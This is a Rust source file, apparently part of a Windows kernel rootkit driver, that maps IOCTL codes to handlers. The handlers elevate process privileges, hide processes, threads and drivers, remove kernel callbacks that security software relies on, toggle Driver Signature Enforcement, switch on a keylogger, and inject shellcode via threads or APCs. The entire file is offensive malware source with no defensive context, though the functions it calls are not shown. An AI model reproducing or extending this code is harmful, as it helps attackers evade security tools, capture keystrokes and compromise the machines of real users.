use {
    crate::{
        *, callbacks::{Callback, CallbackRegistry, CallbackOb, CallbackList}, 
        driver::Driver, injection::InjectionShellcode, keylogger::set_keylogger_state, 
        module::Module, process::Process, thread::Thread
    }, 
    alloc::boxed::Box, 
    core::mem::size_of, 
    hashbrown::HashMap, 
    lazy_static::lazy_static, 
    shared::{
        ioctls::*, 
        structs::*,
    }, 
    wdk_sys::{IO_STACK_LOCATION, IRP, NTSTATUS} 
};

#[cfg(not(feature = "mapper"))]
use {
    crate::{
        process::add_remove_process_toggle,
        thread::add_remove_thread_toggle,
        handle_registry,
        registry::Registry
    },
    shared::structs::{ProcessProtection, ThreadProtection, TargetRegistry},
};

type IoctlHandler = Box<dyn Fn(*mut IRP, *mut IO_STACK_LOCATION) -> NTSTATUS + Send + Sync>;

lazy_static! {
    pub static ref IOCTL_MAP: HashMap<u32, IoctlHandler> = {
        let mut ioctls = HashMap::new();
        ioctls.insert(IOCTL_ELEVATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_ELEVATE_PROCESS");
            let status = unsafe { handle_process!(stack, Process::elevate_process, TargetProcess) };
            unsafe { (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64; }
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_HIDE_UNHIDE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_HIDE_UNHIDE_PROCESS");
            let status = unsafe { handle_process!(stack, Process::process_toggle, ProcessInfoHide) };
            unsafe { (*irp).IoStatus.Information = size_of::<ProcessInfoHide>() as u64; }
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_TERMINATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_TERMINATE_PROCESS");
            let status = unsafe { handle_process!(stack, Process::terminate_process, TargetProcess) };
            unsafe { (*irp).IoStatus.Information = size_of::<TargetProcess> as u64 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_SIGNATURE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_SIGNATURE_PROCESS");
            let status = unsafe { handle_process!(stack, Process::protection_signature, ProcessSignature) };
            unsafe { (*irp).IoStatus.Information = size_of::<ProcessSignature> as u64 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_ENUMERATION_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_ENUMERATION_PROCESS");
            let mut information = 0;
            let status = unsafe { handle_process!(irp, stack, Process::enumerate_process_toggle, EnumerateInfoInput, ProcessListInfo, &mut information) };
            unsafe { (*irp).IoStatus.Information = information as u64 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_HIDE_UNHIDE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_HIDE_UNHIDE_THREAD");
            let status = unsafe { handle_thread!(stack, Thread::thread_toggle, TargetThread) };
            unsafe { (*irp).IoStatus.Information = size_of::<TargetThread> as u64 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_ENUMERATION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_ENUMERATION_THREAD");
            let mut information = 0;
            let status = unsafe { handle_thread!(irp, stack, Thread::enumerate_thread_toggle, EnumerateInfoInput, ThreadListInfo , &mut information) };
            unsafe { (*irp).IoStatus.Information = information as u64 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_HIDE_UNHIDE_DRIVER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_HIDE_UNHIDE_DRIVER");
            let status = unsafe { handle_driver!(stack, Driver::driver_toggle, TargetDriver) };
            unsafe { (*irp).IoStatus.Information = 0 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_ENUMERATE_DRIVER, Box::new(|irp: *mut IRP, _: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_ENUMERATE_DRIVER");
            let mut information = 0;
            let status = unsafe { handle_driver!(irp, Driver::enumerate_driver, DriverInfo, &mut information) };
            unsafe { (*irp).IoStatus.Information = information as u64 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_ENUMERATE_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_ENUMERATE_CALLBACK");
            let mut information = 0;
            let status = unsafe { handle_callback!(irp, stack, CallbackInfoInput, CallbackInfoOutput, &mut information, IOCTL_ENUMERATE_CALLBACK) };
            unsafe { (*irp).IoStatus.Information = information as u64 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_ENUMERATE_REMOVED_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_ENUMERATE_REMOVED_CALLBACK");
            let mut information = 0;
            let status = unsafe { handle_callback!(irp, stack, CallbackInfoInput, CallbackInfoOutput, &mut information, IOCTL_ENUMERATE_REMOVED_CALLBACK) };
            unsafe { (*irp).IoStatus.Information = information as u64 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_REMOVE_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_REMOVE_CALLBACK");
            let status = unsafe { handle_callback!(stack, CallbackInfoInput, IOCTL_REMOVE_CALLBACK) };
            unsafe { (*irp).IoStatus.Information = 0 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_RESTORE_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_RESTORE_CALLBACK");
            let status = unsafe { handle_callback!(stack, CallbackInfoInput, IOCTL_RESTORE_CALLBACK) };
            unsafe { (*irp).IoStatus.Information = 0 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_ENABLE_DSE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_ENABLE_DSE");
            let status = unsafe { handle_driver!(stack, Driver::set_dse_state, DSE) };
            unsafe { (*irp).IoStatus.Information = 0 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_KEYLOGGER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_KEYLOGGER");
            let status = unsafe { handle_driver!(stack, set_keylogger_state, Keylogger) };
            unsafe { (*irp).IoStatus.Information = 0 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_ENUMERATE_MODULE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_ENUMERATE_MODULE");
            let mut information = 0;
            let status = unsafe { handle_module!(irp, stack, Module::enumerate_module, TargetProcess, ModuleInfo, &mut information) };
            unsafe { (*irp).IoStatus.Information = information as u64 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_INJECTION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_INJECTION_THREAD");
            let status = unsafe { handle_injection!(stack, InjectionShellcode::injection_thread, TargetInjection) };
            unsafe { (*irp).IoStatus.Information = 0 };
            status
        }) as IoctlHandler);

        ioctls.insert(IOCTL_INJECTION_APC, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_INJECTION_APC");
            let status = unsafe { handle_injection!(stack, InjectionShellcode::injection_apc, TargetInjection) };
            unsafe { (*irp).IoStatus.Information = 0 };
            status
        }) as IoctlHandler);

        // If the feature is a mapper, these functionalities will not be added.
        #[cfg(not(feature = "mapper"))] {

            ioctls.insert(IOCTL_PROTECTION_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
                log::info!("Received IOCTL_PROTECTION_PROCESS");
                let status = unsafe { handle_process!(stack, add_remove_process_toggle, ProcessProtection) };
                unsafe { (*irp).IoStatus.Information = size_of::<ProcessProtection> as u64 };
                status
            }) as IoctlHandler);
            
            ioctls.insert(IOCTL_PROTECTION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
                log::info!("Received IOCTL_PROTECTION_THREAD");
                let status = unsafe { handle_thread!(stack, add_remove_thread_toggle, ThreadProtection) };
                unsafe { (*irp).IoStatus.Information = size_of::<TargetThread> as u64 };
                status
            }) as IoctlHandler);
        
            ioctls.insert(IOCTL_REGISTRY_PROTECTION_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
                log::info!("Received IOCTL_REGISTRY_PROTECTION_VALUE");
                let status = unsafe { handle_registry!(stack, Registry::add_remove_registry_toggle, TargetRegistry) };
                unsafe { (*irp).IoStatus.Information = 0 };
                status
            }) as IoctlHandler);

            ioctls.insert(IOCTL_REGISTRY_PROTECTION_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
                log::info!("Received IOCTL_REGISTRY_PROTECTION_KEY");
                let status = unsafe { handle_registry!(stack, Registry::add_remove_key_toggle, TargetRegistry) };
                unsafe { (*irp).IoStatus.Information = 0 };
                status
            }) as IoctlHandler);
        }

        ioctls
    };
}